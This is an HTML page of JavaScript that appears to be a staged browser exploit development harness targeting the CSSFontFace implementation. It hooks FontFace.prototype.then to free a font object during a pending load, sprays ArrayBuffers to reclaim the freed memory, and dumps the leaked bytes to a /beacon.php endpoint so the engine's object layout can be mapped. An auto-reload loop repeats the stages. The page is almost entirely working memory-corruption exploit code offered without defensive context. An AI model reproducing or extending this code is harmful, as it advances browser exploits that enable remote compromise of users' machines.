<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1173 CSSFontFace Field Mapper</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1173 — CSSFontFace FIELD MAPPER (our build)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1173-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1173: map OUR build's CSSFontFace layout empirically.
   After the FL leak, run ONE engine font operation per stage and dump
   ALL 24 qwords (192B) of the reclaimed AB as hex. Diffs across stages
   identify which offsets the engine touches per operation (m_status,
   timer, sources, family ptrs...). Community offsets (+130 status,
   +144..191 timer) failed on our build (P1171) — map ours.
   ═══════════════════════════════════════════════════════════════════════ */

var OPS=['baseline','fontscheck','fontsload','canvasfont','stylerecalc','facecycle'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1173_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1173_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+OPS[stage]);
setStatus('STAGE '+stage+'/5 — '+OPS[stage]);

if(stage>=OPS.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1173_stage');}catch(e){}
}else{

try{localStorage.setItem('p1173_stage',''+(stage+1));}catch(e){}
var cur=OPS[stage];

function qdump(ab,label){
  var dv=new DataView(ab);
  var out=[];
  for(var off=0;off<192;off+=8){
    var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
    out.push((hi?hi.toString(16).padStart(8,'0'):'')+lo.toString(16).padStart(8,'0'));
  }
  var rep=label+'|'+out.join(',');
  B('DUMP',rep.slice(0,880));
  log(rep,'info');
  return out;
}

function flLeak(cb){
  setPhase('FL LEAK');
  var done=false;
  var watchdog=setTimeout(function(){if(done)return;done=true;cb(null);},6000);
  function fin(p){if(done)return;done=true;clearTimeout(watchdog);
    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
  try{
    var fired=false,styleEl;
    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
    document.fonts.add(A);void A.loaded;
    styleEl=document.createElement('style');
    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
    document.head.appendChild(styleEl);
    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
      get:function(){
        if(fired)return undefined;fired=true;
        if(styleEl)styleEl.remove();
        try{document.fonts.delete(this);}catch(e){}
        document.body.offsetHeight;
        window.__map=[];
        for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
          window.__map.push({view:new Uint8Array(ab)});}
        try{document.fonts.check('1em s0');}catch(e){}
        return undefined;
      },set:function(){}});
    document.fonts.load('1em f0, s0','AB');
    setTimeout(function(){
      var found=null;
      for(var i=0;i<window.__map.length&&!found;i++){
        var e=window.__map[i];
        var nz=false;for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
        if(nz){found={ab:e.view.buffer};}
      }
      B(found?'FL-HIT':'FL-MISS','');
      fin(found);
    },80);
  }catch(e){B('FL-ERR',e.message);fin(null);}
}

flLeak(function(leak){
  if(!leak){B('NORETRY');setStatus('FL MISS — retry');setTimeout(function(){location.reload(true);},400);return;}

  var op=function(fn){
    try{fn();}catch(e){B('OP-ERR',String(e.message).slice(0,40));}
  };

  if(cur==='fontscheck')op(function(){document.fonts.check('1em s0');});
  if(cur==='fontsload')op(function(){document.fonts.load('1em s0','AB');});
  if(cur==='canvasfont')op(function(){
    var cv=document.createElement('canvas');cv.width=100;cv.height=30;
    var cx=cv.getContext('2d');cx.font='20px s0';cx.measureText('ABCDEF');
  });
  if(cur==='stylerecalc')op(function(){
    for(var i=0;i<100;i++)document.body.offsetHeight;
  });
  if(cur==='facecycle')op(function(){
    var nf=new FontFace('cy','local(Courier)');
    document.fonts.add(nf);void nf.loaded;
    document.fonts.delete(nf);
  });

  setStatus('dumping after '+cur);
  setTimeout(function(){
    var qws=qdump(leak.ab,cur);
    results.push({stage:stage,op:cur,qws:qws.join(',')});
    try{localStorage.setItem('p1173_res',JSON.stringify(results));}catch(e){}
    addFind(cur+': '+qws.filter(function(q){return q!=='00000000';}).join(' '));
    B('NEXT');
    setTimeout(function(){location.reload(true);},600);
  },300);
});

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1173-field-mapper';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
